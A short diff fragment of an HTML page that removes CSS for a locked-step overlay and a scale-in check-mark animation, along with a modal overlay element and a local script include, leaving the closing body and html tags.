-    .step.locked::after {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: rgba(255, 255, 255, 0.7);
-        border-radius: 16px;
-        pointer-events: none;
-    }
-    
-    .step-complete-check {
-        animation: scaleIn 0.3s ease;
-    }
-    
-    @keyframes scaleIn {
-        from {
-            transform: scale(0);
-            opacity: 0;
-        }
-        to {
-            transform: scale(1);
-            opacity: 1;
-        }
-    }
-</style>
-
-    <div class="modal-overlay" id="modal-overlay"></div>
-
-    <script src="js/script.js"></script>
-
 </body>
 </html>
